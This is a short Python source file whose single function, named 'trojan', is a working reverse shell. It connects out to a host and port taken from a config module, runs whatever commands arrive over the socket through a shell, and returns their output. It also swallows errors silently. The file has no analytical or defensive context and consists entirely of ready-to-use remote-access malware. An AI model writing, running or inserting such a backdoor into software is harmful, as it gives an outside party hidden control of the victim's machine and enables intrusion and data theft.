from configs import HOST, PORT
import socket
import subprocess


def trojan():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))

        while True:
            command = client.recv(1024).decode("utf-8")

            if command.lower() == "exit":
                break

            try:
                # Execute command and get both stdout and stderr
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout
                if result.stderr:
                    output += "\nError: " + result.stderr
                if not output.strip():  # If truly empty
                    output = "Command completed with no output"

            except Exception as e:
                output = f"Error: {str(e)}"

            # Send actual output back
            client.send(output.encode("utf-8"))

    except Exception:
        pass
    finally:
        try:
            client.close()
        except:
            pass


